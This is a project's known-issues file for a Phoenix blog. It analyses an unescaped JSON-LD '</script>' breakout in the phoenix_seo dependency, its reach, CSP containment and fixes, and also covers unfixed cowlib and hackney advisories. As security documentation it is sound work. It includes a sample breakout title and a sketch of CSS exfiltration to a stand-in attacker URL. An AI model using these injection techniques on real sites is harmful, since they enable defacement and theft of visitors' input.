# Known issues (upstream, monitored)

Issues in dependencies we can't fix in our own code, with why they're accepted
and what would resolve them.

## phoenix_seo emits JSON-LD without HTML-escaping (`</script>` breakout)

**Where:** `deps/phoenix_seo/lib/seo/json_ld.ex` renders the JSON-LD block as

```elixir
<script :if={@item} type="application/ld+json">
  <%= Phoenix.HTML.raw(@json_library.encode!(@item)) %>
</script>
```

It calls `Jason.encode!/1` with **no** `escape: :html_safe` option. Jason's
default does not escape `<` / `/`, so a value containing the literal bytes
`</script>` is emitted verbatim inside the `<script>` element. An HTML parser
terminates a script element on the first `</script` byte sequence regardless of
the element's `type`, so the JSON-LD block ends early and whatever follows is
parsed as live markup.

**Reachability here:** on `/posts/:slug`, our `SEO.JSONLD.Build` for
`Newton.Blog.Post` (`lib/newton_web/seo.ex`) puts the post `title` and `excerpt`
into the record. Those are plain string fields cast in `Newton.Blog.Post`
(not run through the markdown sanitizer). So an author who writes a title like
`Evil</script><style>…</style>` produces live markup in every visitor's
`<head>`. The other pages (`/`, `/photos`, `/reading`, resume) only feed
hardcoded strings into JSON-LD, so `/posts/:slug` is the only reachable route.

**Severity: Medium, and currently contained.**

- The trigger is **author-authored** — only the authenticated admin (or a
  hijacked admin session) can set a post title/excerpt. There's no public write
  path.
- Our Content-Security-Policy (`lib/newton_web/content_security_policy.ex`) is
  `script-src 'self' 'nonce-…'` with no `'unsafe-inline'`, so an injected
  `<script>` **does not execute** and inline event handlers don't fire.
- What the breakout still buys an attacker: `style-src 'unsafe-inline'` +
  `img-src … https:` allow CSS-based exfiltration (attribute-selector
  keylogging, `background: url(https://attacker/…)`) and visual
  defacement/phishing. And it removes a defense-in-depth layer — if the CSP is
  ever loosened or bypassed, this becomes full stored XSS.

**Why we haven't patched it:** the fix is one option on a call site inside
`deps/`, which we don't edit directly. The correct resolutions, in order of
preference:

1. Upstream fix — `Jason.encode!(@item, escape: :html_safe)` in phoenix_seo
   (worth filing/PRing; the project is `github.com/dbernheisel/phoenix_seo`).
2. Until then, if we want belt-and-suspenders in our own code: sanitize
   `title`/`excerpt` on the way into the JSON-LD record in
   `lib/newton_web/seo.ex` (e.g. strip/deny `<`), or stop relying on
   phoenix_seo's JSON-LD renderer and emit the `ld+json` ourselves with
   `escape: :html_safe`.

**Monitor:** the same repo we already watch for the phoenix_seo 0.3.0 release
(see `docs/roadmap.md`). A fixed release closes this.

## cowlib / hackney advisories (no in-range fix)

`mix hex.audit` reports `cowlib 2.18.0` (MEDIUM/LOW) and `hackney 1.25.0`
(HIGH/MEDIUM) with no patched releases available. Neither is exploitable in our
usage:

- **cowlib** is pulled by `plug_cowboy`, which only serves the private PromEx
  metrics port (9091, Fly private network — not publicly reachable).
- **hackney** is pulled by `tzdata`, which fetches timezone data from a fixed
  IANA host. The advisories (SOCKS5 timeout, SSRF allowlist bypass, CRLF
  injection) all require attacker-influenced URLs or request options, which
  that usage never exposes.

Re-check on any dependency work; bump when upstream ships fixes.
